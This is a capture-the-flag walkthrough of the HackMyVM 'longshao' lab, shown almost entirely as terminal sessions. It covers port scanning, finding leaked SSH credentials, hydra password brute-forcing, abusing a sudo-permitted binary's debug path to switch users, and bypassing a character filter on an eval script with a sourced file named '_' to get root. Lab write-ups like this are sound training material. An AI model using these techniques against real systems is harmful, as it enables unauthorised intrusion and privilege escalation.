author: hhh123
category: beginner
platform: hackmyvm
name: longshao

```zsh
❯ nmap -sn 192.168.56.0/24                           
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 18:56 +0700
Nmap scan report for 192.168.56.1
Host is up (0.00057s latency).
Nmap scan report for 192.168.56.100
Host is up (0.0010s latency).
Nmap scan report for 192.168.56.139
Host is up (0.0033s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.91 seconds

~/projects/labs/hmv                                                                                      18:56:56
❯ ip=192.168.56.139

~/projects/labs/hmv                                                                                      18:57:02
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip               
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 18:57 +0700
Nmap scan report for 192.168.56.139
Host is up (0.0093s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds

~/projects/labs/hmv                                                                                      18:57:10
❯ nmap -p 22,80 -sCV -Pn -T4 --min-rate 5000 $ip     
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 18:57 +0700
Nmap scan report for 192.168.56.139
Host is up (0.00025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.67 ((Unix))
|_http-title: Maze \xE5\x86\x85\xE9\x83\xA8\xE7\xAE\xA1\xE7\x90\x86\xE7\xB3\xBB\xE7\xBB\x9F - \xE7\x99\xBB\xE5\xBD\x95
|_http-server-header: Apache/2.4.67 (Unix)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
```

```zsh
  
~/projects/labs/hmv                                                                                      19:01:25  
❯ gobuster dir -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-mediu  
m.txt -x txt,php,html    
===============================================================  
Gobuster v3.8.2  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://192.168.56.139/  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.tx  
t  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8.2  
[+] Extensions:              html,txt,php  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
index.php            (Status: 200) [Size: 2574]  
dashboard.php        (Status: 200) [Size: 1572]  
server-status        (Status: 403) [Size: 317]  
Progress: 882228 / 882228 (100.00%)  
===============================================================  
Finished  
===============================================================
```

![[machines/longshao/images/image.png]]

```zsh
~/projects/labs/hmv                                                                                   7s 18:57:35
❯ ssh baolong@$ip
The authenticity of host '192.168.56.139 (192.168.56.139)' can't be established.
ED25519 key fingerprint is: SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.139' (ED25519) to the list of known hosts.
baolong@192.168.56.139's password: 
              _                          
__      _____| | ___ ___  _ __ ___   ___ 
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|

baolong@longshao:~$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
baolong:x:1000:1000::/home/baolong:/bin/bash
chaojibaolong:x:1001:1001::/home/chaojibaolong:/bin/bash
chaojiwudilong:x:1002:1002::/home/chaojiwudilong:/bin/bash
baolong@longshao:~$ id
uid=1000(baolong) gid=1000(baolong) groups=1000(baolong)
baolong@longshao:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null  
-rwsr-xr-x    1 root     root         30768 Apr 10 02:56 /bin/umount  
---s--x--x    1 root     root         14224 Jan 10  2026 /bin/bbsuid  
-rwsr-xr-x    1 root     root         38960 Apr 10 02:56 /bin/mount  
-rwsr-xr-x    1 root     root         26824 Apr 10 03:19 /usr/bin/expiry  
-rwsr-xr-x    1 root     root         48464 Apr 10 03:19 /usr/bin/chsh  
-rwsr-xr-x    1 root     root         80552 Apr 10 03:19 /usr/bin/chage  
-rwsr-xr-x    1 root     root         88968 Apr 10 03:19 /usr/bin/passwd  
-rwsr-xr-x    1 root     root         67680 Apr 10 03:19 /usr/bin/gpasswd  
-rwsr-xr-x    1 root     root        199632 Jan 23  2026 /usr/bin/sudo  
-rwsr-xr-x    1 root     root         50032 Apr 10 03:19 /usr/bin/chfn  
-rwsr-xr-x    1 root     root        14224 May  5 13:40 /usr/sbin/suexec
```

```zsh
baolong@longshao:~$ cat /var/www/html/index.php
<?php
// 靶机凭据配置
$target_user = "admin";
$target_pass = "mexico";

$message = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    if ($username === $target_user && $password === $target_pass) {
        header("Location: dashboard.php", true, 302);
        exit();
    } else {
        $message = "<span style='color: #e74c3c;'>用户名或密码错误。</span>";
    }
}
?>
...
```

```zsh
baolong@longshao:~$ cat /var/www/html/dashboard.php
...
<div class="notice-box">
    <h3>📢 运维紧急通知 (Internal Broadcast)</h3>
    <p>因近期遭受不明网络扫描，系统核心逻辑正在向 C 语言黑盒迁移。</p>
    <p>为了方便后续信息审计，临时生成的后备堡垒机凭据如下：</p>
    <p>👉 SSH 凭据：<span class="secret-flag">baolong:jinhua</span></p>
    <p style="color: #e74c3c; font-size: 12px;">* 请相关运维人员（暴龙）见字立刻登录服务器并修改初始密码！</p>
</div>
...
```

```zsh
baolong@longshao:~$ ls -la /opt/internal/
total 24
drwxr-xr-x    2 root     root          4096 May 28 11:08 .
drwxr-xr-x    3 root     root          4096 May 26 15:33 ..
-rwxr-x---    1 root     chaojibaolong     14152 May 28 11:08 parser_core
```

```zsh
~/projects/labs/hmv                                                                                      19:37:13
❯ hydra -l chaojibaolong -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt ssh://192.168.56.139 -t 4 -f
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak ...

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-29 19:37:13
[DATA] max 4 tasks per 1 server, overall 4 tasks, 10000 login tries (l:1/p:10000), ~2500 tries per task
[DATA] attacking ssh://192.168.56.139:22/
[22][ssh] host: 192.168.56.139   misc: (null)   login: chaojibaolong   password: love123
[STATUS] attack finished for 192.168.56.139 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-29 19:37:34
```

```zsh
~/projects/labs/hmv                                                                                      19:45:00
❯ ssh chaojibaolong@$ip
chaojibaolong@192.168.56.139's password: 
Last login: ...
chaojibaolong@longshao:~$ sudo -l
Matching Defaults entries for chaojibaolong on longshao:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User chaojibaolong may run the following commands on longshao:
    (ALL : ALL) NOPASSWD: /usr/local/bin/check_parser
```

```zsh
chaojibaolong@longshao:~$ cat /usr/local/bin/check_parser
#!/bin/sh
if [ "$(id -u)" -ne 0 ]; then
  echo "syslog-rotate: general protection fault: permission denied." >&2
  exit 1
fi
if [ -z "$1" -a ! -f "$1" ]; then
    echo "Usage: $(basename $0) <target_spool_path> [--force-cron]"
    exit 1
fi
exec /opt/internal/parser_core "$@"
```

```zsh
chaojibaolong@longshao:~$ strings /opt/internal/parser_core
execl
strncmp
puts
strlen
stderr
getuid
access
strcmp
[!] Security Violation: Core parser must retain eUID 0.
[!] Parameter Error: Invalid cluster argument count.
[!] Compliance Error: Only *.log files are authorized.
[!] Path Restriction: Access denied.
=================================================
  ChaoJiBaoLong Log Analyser - Security Core v3  
[!] Error: Target log file not found.
[*] DevSecOps Emergency Notice: Switching context...
[+] Analysis completed successfully.
--debug
.log
/tmp/
chaojiwudilong
/bin/su
[*] Reading log file...
```

```zsh
chaojibaolong@longshao:~$ objdump -d /opt/internal/parser_core | grep -A20 "execl"
...
    11fa:	48 8d 3d 6f 0f 00 00 	lea    0xf6f(%rip),%rdi        # 2170
    1201:	e8 2a fe ff ff       	call   puts
    1206:	45 31 c0             	xor    %r8d,%r8d
    1209:	31 c0                	xor    %eax,%eax
    120b:	48 8d 0d ce 0f 00 00 	lea    0xfce(%rip),%rcx        # 21e0
    1212:	48 8d 15 d6 0f 00 00 	lea    0xfd6(%rip),%rdx        # 21ef
    1219:	48 8d 35 d6 0f 00 00 	lea    0xfd6(%rip),%rsi        # 21f6
    1220:	48 8d 3d ca 0f 00 00 	lea    0xfca(%rip),%rdi        # 21f1
    1227:	e8 f4 fd ff ff       	call   execl
...
# execl("/bin/su", "su", "-", "chaojiwudilong", NULL) when --debug flag is set and log file doesn't exist
```

```zsh
chaojibaolong@longshao:~$ sudo /usr/local/bin/check_parser /tmp/nonexistent.log --debug
=================================================
  ChaoJiBaoLong Log Analyser - Security Core v3  
=================================================
[!] Error: Target log file not found.
[*] DevSecOps Emergency Notice: Switching context...
chaojiwudilong@longshao:~$ id
uid=1002(chaojiwudilong) gid=1002(chaojiwudilong) groups=1002(chaojiwudilong)
chaojiwudilong@longshao:~$ sudo -l
User chaojiwudilong may run the following commands on longshao:
    (root) NOPASSWD: /usr/local/bin/a.sh
```

```zsh
chaojiwudilong@longshao:~$ cat /usr/local/bin/a.sh
#!/bin/bash
PATH=/usr/bin

cd /tmp

read CMD < <(head -n1 | tr -d "[A-Za-z0-9/]")
eval "$CMD"
```

```zsh
# Create payload file with non-alphanumeric name to bypass tr filter
baolong@longshao:~$ printf 'export PATH=/bin:/usr/bin:/sbin:/usr/sbin\nid\nwhoami\nhostname\ncat /home/baolong/user.txt /root/root.txt\n' > /tmp/_

# Source the file via a.sh (input ". _" survives tr -d "[A-Za-z0-9/]" filter)
chaojiwudilong@longshao:~$ sudo /usr/local/bin/a.sh
. _
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
root
longshao
flag{user-3408c2a9ca636da4a40f054eea401fd9}
flag{root-e0bf0dabcccb7d4519c0ad4b431aff16}
```

